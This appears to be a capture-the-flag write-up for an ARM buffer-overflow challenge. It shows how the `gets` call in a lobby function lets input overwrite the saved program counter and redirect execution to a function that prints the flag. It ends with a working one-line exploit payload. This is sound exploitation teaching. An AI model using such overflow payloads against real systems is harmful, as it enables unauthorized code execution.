### Intended solution

This challenge is an ARM binary exploitation challenge.

Analysing the binary we can see the `gets` funtion is used and this can be used to exploit the binary.

Opening this binary in gdb we can see the following functions
```bash
..
..
0x00010470  frame_dummy
0x000104cc  initialize
0x0001053c  lobby
0x000105f8  main
0x00010614  roomA1
0x00010660  roomA5
0x000106ac  roomA12
0x000106f8  roomB3
0x00010744  roomB11
..
..
```

Looking at the `main()` it calls the lobby functions which takes a string input using gets and prints it. So our task is to overflow the stack to overwrite the saved pc in the stack.<br/>
Upon analysis we can see that the stack frame of the function `lobby` is 48 bytes.<br/>
We have 5 similar looking function and we have to find the function which will give us the flag<br/>
Analysing the strings in the functions we can find the string `cat /home/ubuntu/flag` is used as the argument of the system function of `roomB3()`. Therefore this is the required function

So final exploit will be :
```bash
$ python -c 'print 48*"A" + "\xf8\x06\x01\x00"' | ./arm_bof
```

